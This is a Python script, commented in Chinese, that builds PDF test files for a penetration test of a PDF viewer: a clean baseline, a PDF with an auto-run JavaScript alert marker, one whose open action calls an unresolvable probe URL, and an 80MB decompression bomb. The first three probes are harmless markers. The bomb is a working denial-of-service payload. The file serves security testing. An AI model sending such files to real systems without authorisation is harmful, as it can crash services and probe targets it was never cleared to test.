# -*- coding: utf-8 -*-
"""
generate_pdf_payloads.py
生成 PDF 渗透测试所需的 payload（均为良性探针，不含真实恶意行为）。

输出：
  clean.pdf      —— 干净的最小合法 1 页 PDF（基线）
  js.pdf         —— 内嵌 OpenAction JavaScript，仅 app.alert 一个唯一标记（探测 PDF-JS 是否会在客服查看器执行）
  uri.pdf        —— 打开时触发 URI 动作指向不可解析域（探测 SSRF/钓鱼；无真实外泄）
  bomb.pdf       —— PDF 解压炸弹：文件很小，但含一个 FlateDecode 流解压后约 80MB（探测解析/渲染 DoS）

用法：python generate_pdf_payloads.py
"""
import os
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))


def build_pdf(objects, root=1, extra_trailer=''):
    """objects: list of (objnum, body_bytes)。自动计算 xref，返回完整 PDF 字节。"""
    out = bytearray(b'%PDF-1.7\n%\xe2\xe3\xcf\xd3\n')
    offsets = {}
    for num, content in objects:
        offsets[num] = len(out)
        out += f'{num} 0 obj\n'.encode('latin-1')
        out += content
        out += b'\nendobj\n'
    xref_pos = len(out)
    size = max(n for n, _ in objects) + 1
    out += f'xref\n0 {size}\n'.encode('latin-1')
    out += b'0000000000 65535 f \n'
    for i in range(1, size):
        out += f'{offsets.get(i, 0):010d} 00000 n \n'.encode('latin-1')
    out += f'trailer\n<</Size {size}/Root {root} 0 R{extra_trailer}>>\nstartxref\n{xref_pos}\n%%EOF'.encode('latin-1')
    return bytes(out)


def stream_obj(dict_prefix, data_bytes):
    return dict_prefix + f'/Length {len(data_bytes)}>>\nstream\n'.encode('latin-1') + data_bytes + b'\nendstream'


def clean_pdf():
    content = b'BT /F1 24 Tf 72 700 Td (K6ST safetest clean PDF) Tj ET'
    objs = [
        (1, b'<</Type/Catalog/Pages 2 0 R>>'),
        (2, b'<</Type/Pages/Kids[3 0 R]/Count 1>>'),
        (3, b'<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>'),
        (4, stream_obj(b'<<', content)),
        (5, b'<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>'),
    ]
    return build_pdf(objs)


def js_pdf():
    # OpenAction + 文档级 Names/JavaScript，仅弹一个唯一标记
    js = b'app.alert\\(\'K6ST_PDFJS_MARKER\'\\);'
    objs = [
        (1, b'<</Type/Catalog/Pages 2 0 R/OpenAction 6 0 R/Names<</JavaScript<</Names[(K6ST) 6 0 R]>>>>>>'),
        (2, b'<</Type/Pages/Kids[3 0 R]/Count 1>>'),
        (3, b'<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>'),
        (4, stream_obj(b'<<', b'BT /F1 18 Tf 72 700 Td (K6ST PDF with JavaScript) Tj ET')),
        (5, b'<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>'),
        (6, b'<</S/JavaScript/JS(' + js + b')>>'),
    ]
    return build_pdf(objs)


def uri_pdf():
    # 打开即触发 URI 动作 + 页面上一个 Link 注解，均指向不可解析域（SSRF/钓鱼探针）
    url = b'https://k6st-pdf-ssrf.example.invalid/probe'
    objs = [
        (1, b'<</Type/Catalog/Pages 2 0 R/OpenAction 6 0 R>>'),
        (2, b'<</Type/Pages/Kids[3 0 R]/Count 1>>'),
        (3, b'<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R'
            b'/Annots[<</Type/Annot/Subtype/Link/Rect[72 690 300 720]/A<</S/URI/URI(' + url + b')>>>>]>>'),
        (4, stream_obj(b'<<', b'BT /Helvetica 18 Tf 72 700 Td (K6ST PDF URI action) Tj ET')),
        (6, b'<</S/URI/URI(' + url + b')>>'),
    ]
    return build_pdf(objs)


def bomb_pdf(decompressed_mb=80):
    # 页面内容流：真实内容 + 海量空白，FlateDecode 压缩后极小，解压后约 decompressed_mb MB
    raw = b'BT /F1 24 Tf 72 700 Td (K6ST PDF bomb) Tj ET\n' + b' ' * (decompressed_mb * 1024 * 1024)
    comp = zlib.compress(raw, 9)
    objs = [
        (1, b'<</Type/Catalog/Pages 2 0 R>>'),
        (2, b'<</Type/Pages/Kids[3 0 R]/Count 1>>'),
        (3, b'<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>'),
        (4, stream_obj(b'<</Filter/FlateDecode', comp)),
        (5, b'<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>'),
    ]
    return build_pdf(objs)


def main():
    items = {
        'clean.pdf': clean_pdf(),
        'js.pdf': js_pdf(),
        'uri.pdf': uri_pdf(),
        'bomb.pdf': bomb_pdf(80),
    }
    for name, data in items.items():
        path = os.path.join(HERE, name)
        with open(path, 'wb') as f:
            f.write(data)
        print(f'[OK] {name}: {len(data)} 字节')


if __name__ == '__main__':
    main()
